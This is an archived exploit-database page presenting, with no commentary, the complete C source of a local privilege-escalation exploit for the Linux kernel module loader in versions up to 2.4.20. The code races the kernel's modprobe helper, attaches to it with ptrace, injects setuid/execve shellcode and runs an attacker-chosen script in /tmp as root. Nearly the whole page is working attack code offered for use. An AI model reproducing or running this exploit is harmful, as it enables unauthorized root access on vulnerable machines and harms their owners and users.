<html>
<head>
<title>Linux Kernel < 2.4.20 Module Loader Local Root Exploit</title>
<pre>
/***********************************************
*					         
*       Linux Kernel Module Loader Local R00t Exploit	 
*	              Up to 2.4.20			
*	        By anonymous KuRaK			
*						
************************************************

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;signal.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/ptrace.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;linux/user.h&gt;



#define TMPSIZE 4096
#define FMAX 768
#define UIDNUM 6
#define MMSIZE (4096*1)
#define MAXSTACK 0xc0000000

//      where to put the root script
#define SHELL &quot;/tmp/w00w00w&quot;

//      what to open to run modprobe
#define ENTRY &quot;/dev/dsp3&quot;


struct uids {
    unsigned uid;
    unsigned euid;
    unsigned suid;
    unsigned fsuid;
};


//      thanks to the epcs2.c code :-))
char shellcode[] = &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; &quot;\x31\xc0\x31\
xdb\xb0\x17\xcd\x80&quot;	/* setuid(0) */
    &quot;\x31\xc0\xb0\x2e\xcd\x80&quot; &quot;\x31\xc0\x50\xeb\x17\x8b\x1c\x24&quot;	
/* execve(SHELL) */
    &quot;\x90\x90\x90\x89\xe1\x8d\x54\x24&quot;	/* lets be tricky */
    &quot;\x04\xb0\x0b\xcd\x80\x31\xc0\x89&quot;
    &quot;\xc3\x40\xcd\x80\xe8\xe4\xff\xff&quot; &quot;\xff&quot; SHELL &quot;\x00\x00\x00\x00&quot;;


//      payload...
char *shellcmd = &quot;#!/bin/sh\nid|wall\necho \&quot;Your kernel is buggy\&quot;|wall&quot;;


volatile int sig = 0;
volatile struct user_regs_struct regs;


void sighnd(int v)
{
    sig++;
}


void fatal(const char *msg)
{
    printf(&quot;\n&quot;);
    if (!errno) {
	fprintf(stderr, &quot;FATAL ERROR: %s\n&quot;, msg);
    } else {
	perror(msg);
    }
    printf(&quot;\n&quot;);
    fflush(stdout);
    fflush(stderr);
    exit(129);
}


void exploit(int pid)
{
    int i;

    if (ptrace(PTRACE_GETREGS, pid, 0, &amp;regs))
	fatal(&quot;ptrace: PTRACE_GETREGS&quot;);
    for (i = 0; i &lt;= sizeof(shellcode); i += 4) {
	if (ptrace
	    (PTRACE_POKETEXT, pid, regs.eip + i, *(int *) (shellcode + i)))
	    fatal(&quot;ptrace: PTRACE_POKETEXT&quot;);
    }
    if (ptrace(PTRACE_SETREGS, pid, 0, &amp;regs))
	fatal(&quot;ptrace: PTRACE_SETREGS&quot;);
    ptrace(PTRACE_DETACH, pid, 0, 0);
    kill(pid, SIGCONT);
}


int get_ids(FILE * fp, struct uids *uids)
{
    int i;
    char tmp[TMPSIZE];


    fseek(fp, 0, SEEK_SET);
    for (i = 0; i &lt; UIDNUM; i++)
	fgets(tmp, sizeof(tmp), fp);
    return fscanf(fp, &quot;Uid: %u %u %u %u&quot;, &amp;uids-&gt;uid, &amp;uids-&gt;euid,
		  &amp;uids-&gt;suid, &amp;uids-&gt;fsuid);
}


int main(int ac, char **av)
{
    int fd, pid, p, i;
    char buf[TMPSIZE];
    struct uids uids;
    FILE *fp;


    setpgrp();
    setsid();
    umask(022);
    unlink(SHELL);
    fd = open(SHELL, O_RDWR | O_CREAT | O_TRUNC, 0755);
    fp = fdopen(fd, &quot;w+&quot;);
    fprintf(fp, &quot;%s\n&quot;, shellcmd);
    fclose(fp);

    pid = getpid() + 2;
    snprintf(buf, sizeof(buf) - 1, &quot;/proc/%d/status&quot;, pid);
    printf(&quot;\nModprobe pid %d, my pid %d&quot;, pid, getpid());
    fflush(stdout);
    signal(SIGUSR1, sighnd);

//      fork modprobe helper
    if (!(p = fork())) {
//      some nice work for exec_usermodehelper(), keep it busy!
	for (i = 0; i &lt; FMAX; i++) {
	    fd = open(&quot;/dev/zero&quot;, O_RDWR);
	    mmap(NULL, MMSIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
	}
	kill(getppid(), SIGUSR1);
	while (!sig);
	printf(&quot;\nHelper (pid %d) requesting module...&quot;, getpid());
	fflush(stdout);
	fd = open(ENTRY, O_RDONLY | O_NONBLOCK);
	exit(0);
    }
//      synchronize with the child
    else {
	while (!sig);
	kill(p, SIGUSR1);

//      wait for modprobe to run at unprivileged level
	while (1) {
	    fd = open(buf, O_RDONLY);
	    if (fd &gt; 0) {
		if (!(fp = fdopen(fd, &quot;r&quot;)))
		    fatal(&quot;fdopen&quot;);
		if (get_ids(fp, &amp;uids) != 4
		    || (uids.uid != uids.euid || uids.uid != uids.suid
			|| uids.uid != uids.fsuid)) {
		    fatal(&quot;did not catch modprobe...try again later :-)&quot;);
		}
//      ok, it runs...
		while (1) {
		    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL)) {
			fatal(&quot;PTRACE_ATTACH failed!&quot;);
		    } else {
			i = 0;
			printf(&quot;\nAttached afterburner...\n&quot;);
			fflush(stdout);
			while (ptrace(PTRACE_GETREGS, pid, 0, &amp;regs)
			       || !regs.eip || regs.eip &gt;= MAXSTACK) {
			    ptrace(PTRACE_SYSCALL, pid, NULL, NULL);
			    printf(&quot;\rplease wait %d&quot;, i++);
			    fflush(stdout);
			}
			waitpid(pid, NULL, WUNTRACED);
			printf
			    (&quot;\nValid EIP found EIP=%p\nexploiting the bug, good luck... &quot;,
			     regs.eip);
			fflush(stdout);
			exploit(pid);
			exit(0);
		    }
		}
		fclose(fp);
	    }
	}
    }

    return 0;
}



# milw0rm.com [2003-04-14]
</pre>
</html>

